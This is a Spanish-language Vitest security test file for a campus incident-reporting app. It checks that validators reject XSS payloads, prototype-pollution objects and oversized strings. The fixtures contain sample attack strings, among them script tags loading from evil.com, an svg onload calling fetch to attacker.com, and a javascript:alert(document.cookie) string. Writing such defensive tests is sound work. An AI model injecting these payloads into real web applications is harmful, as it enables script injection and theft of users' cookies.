import { describe, expect, it } from "vitest";
import {
  isWithinCampusBounds,
  parsePlaces,
  validateIncidentReport,
} from "@unimovil/contracts";
import catalog from "../../../apps/mobile/src/features/campus/data/catalog.json";

describe("Auditoría de Seguridad Transversal (HU-090, HU-091, HU-094)", () => {
  describe("Sanitización contra Inyecciones XSS y HTML en Reportes", () => {
    const validCoords = { latitude: 40.4485, longitude: -3.7295 };

    it("intercepta y rechaza etiquetas <script> y scripts activos en el reporte", () => {
      const maliciousInput = {
        title: "Peligro <script>alert('xss')</script> en túnel",
        description:
          "Hueco profundo <script src='http://evil.com/x.js'></script>",
        type: "obra",
        severity: "alta",
        coordinates: validCoords,
      };

      const result = validateIncidentReport(maliciousInput);
      expect(result.isValid).toBe(false);
      expect(
        result.errors.some(
          (e) => e.field === "title" && e.code === "ERR_TITLE_INVALID_CHARS",
        ),
      ).toBe(true);
      expect(
        result.errors.some(
          (e) =>
            e.field === "description" && e.code === "ERR_TITLE_INVALID_CHARS",
        ),
      ).toBe(true);
    });

    it("intercepta y rechaza manejadores de eventos en línea (onerror, onload, onmouseover)", () => {
      const payload = {
        title: "Bache con fallo <img src=x onerror=alert(1)>",
        description:
          "Cuidado en la acera <svg/onload=fetch('http://attacker.com')>",
        type: "desvio",
        severity: "media",
        coordinates: validCoords,
      };

      const result = validateIncidentReport(payload);
      expect(result.isValid).toBe(false);
      expect(
        result.errors.some(
          (e) => e.field === "title" && e.code === "ERR_TITLE_INVALID_CHARS",
        ),
      ).toBe(true);
      expect(
        result.errors.some(
          (e) =>
            e.field === "description" && e.code === "ERR_TITLE_INVALID_CHARS",
        ),
      ).toBe(true);
    });

    it("intercepta y rechaza esquemas de pseudo-protocolos javascript: e iframes", () => {
      const payload = {
        title: "Rampa rota javascript:alert(document.cookie)",
        description:
          "Incidencia con enlace fraudulento <iframe src='http://evil.com'></iframe>",
        type: "rampa_averiada",
        severity: "alta",
        coordinates: validCoords,
      };

      const result = validateIncidentReport(payload);
      expect(result.isValid).toBe(false);
      expect(
        result.errors.some(
          (e) => e.field === "title" && e.code === "ERR_TITLE_INVALID_CHARS",
        ),
      ).toBe(true);
      expect(
        result.errors.some(
          (e) =>
            e.field === "description" && e.code === "ERR_TITLE_INVALID_CHARS",
        ),
      ).toBe(true);
    });
  });

  describe("Defensa contra Contaminación de Prototipos (Prototype Pollution)", () => {
    const validCoords = { latitude: 40.4485, longitude: -3.7295 };

    it("evita que la inyección de __proto__ modifique el prototipo global de Object", () => {
      const maliciousJson = JSON.parse(
        '{"title":"Aviso de prueba","description":"Detalle seguro de incidencia","type":"obra","severity":"baja","coordinates":{"latitude":40.4485,"longitude":-3.7295},"__proto__":{"polluted":true}}',
      );

      const result = validateIncidentReport(maliciousJson);
      expect(result.isValid).toBe(true);

      const probe: Record<string, unknown> = {};
      expect(probe["polluted"]).toBeUndefined();
    });

    it("descarta propiedades constructor y prototype sospechosas", () => {
      const maliciousInput = {
        title: "Incidencia común en campus",
        description: "Descripción de prueba verificada",
        type: "acera_cortada",
        severity: "baja",
        coordinates: validCoords,
        constructor: { prototype: { adminRole: true } },
      };

      const result = validateIncidentReport(maliciousInput);
      expect(result.isValid).toBe(true);
      expect(
        (result.data as unknown as Record<string, unknown>)["constructor"],
      ).toBe(Object);
    });
  });

  describe("Validación Estricta de Coordenadas Numéricas y Detección de Desbordamientos", () => {
    it("rechaza NaN e infinitos en coordenadas geográficas", () => {
      expect(
        isWithinCampusBounds({
          latitude: NaN,
          longitude: -3.7295,
        }),
      ).toBe(false);

      expect(
        isWithinCampusBounds({
          latitude: Infinity,
          longitude: -3.7295,
        }),
      ).toBe(false);

      expect(
        isWithinCampusBounds({
          latitude: 40.4485,
          longitude: -Infinity,
        }),
      ).toBe(false);
    });

    it("rechaza inyecciones de strings y tipos no numéricos en comprobaciones de coordenadas", () => {
      expect(
        isWithinCampusBounds({
          latitude: "40.4485" as unknown as number,
          longitude: -3.7295,
        }),
      ).toBe(false);

      expect(
        isWithinCampusBounds({
          latitude: 40.4485,
          longitude: { evil: true } as unknown as number,
        }),
      ).toBe(false);
    });

    it("resiste cargas con cadenas excesivamente largas sin agotar memoria", () => {
      const hugeString = "A".repeat(50000);
      const payload = {
        title: hugeString,
        description: "Normal",
        type: "obra",
        severity: "baja",
        coordinates: { latitude: 40.4485, longitude: -3.7295 },
      };

      const result = validateIncidentReport(payload);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe("Inmunidad de Catálogo y Parseo de Lugares (parsePlaces)", () => {
    it("ignora propiedades extra no declaradas y previene manipulación de esquema", () => {
      const validPlace = catalog[0]!;
      const rawCatalogWithInjection = [
        {
          ...validPlace,
          maliciousPayload: "<script>steal()</script>",
          adminAccess: true,
          internalToken: "supersecret-12345",
        },
      ];

      const parsed = parsePlaces(rawCatalogWithInjection);
      expect(parsed.length).toBe(1);
      const place = parsed[0]!;
      expect(place.id).toBe(validPlace.id);
      expect(place.name).toBe(validPlace.name);
      expect(
        (place as unknown as Record<string, unknown>)["maliciousPayload"],
      ).toBeUndefined();
      expect(
        (place as unknown as Record<string, unknown>)["adminAccess"],
      ).toBeUndefined();
      expect(
        (place as unknown as Record<string, unknown>)["internalToken"],
      ).toBeUndefined();
    });

    it("rechaza entradas con coordenadas fuera del recinto universitario", () => {
      const validPlace = catalog[0]!;
      const catalogOutside = [
        {
          ...validPlace,
          coordinates: { latitude: 0.0, longitude: 0.0 },
        },
      ];

      expect(() => parsePlaces(catalogOutside)).toThrow();
    });
  });
});
